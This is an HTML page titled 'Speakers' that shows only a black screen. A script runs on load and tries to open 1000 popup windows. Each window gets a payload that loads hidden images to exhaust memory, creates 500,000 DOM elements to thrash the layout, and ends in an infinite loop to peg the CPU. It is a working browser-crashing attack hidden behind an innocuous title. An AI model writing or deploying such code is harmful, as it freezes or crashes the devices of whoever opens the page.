<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>Speakers</title>
<style>
  html, body {
    margin:0; padding:0; width:100%; height:100%; background:black;
  }
</style>
</head>
<body>
<script>
(function(){
  const payload = `
    <html>
    <head><title></title></head>
    <body style="background:black;margin:0;">
      <script>
        // Load 50 large hidden images to kill RAM
        for(let i=0; i<50; i++){
          let img = new Image();
          img.src = 'https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png';
          img.style.display = 'none';
          document.body.appendChild(img);
        }
        // Create 500,000 divs to spam DOM and cause layout thrashing
        for(let i=0; i<500000; i++){
          let d = document.createElement('div');
          d.style.position = 'absolute';
          d.style.top = (Math.random()*100) + '%';
          d.style.left = (Math.random()*100) + '%';
          d.style.width = '10px';
          d.style.height = '10px';
          d.style.background = 'black';
          document.body.appendChild(d);
        }
        // Max CPU usage after 0.5s
        setTimeout(()=>{ while(true){} }, 500);
      <\/script>
    </body>
    </html>
  `;

  for(let i=0; i<1000; i++){
    let w = window.open('', '_blank');
    if(w){
      w.document.write(payload);
      w.document.close();
    }
  }
})();
</script>
</body>
</html>
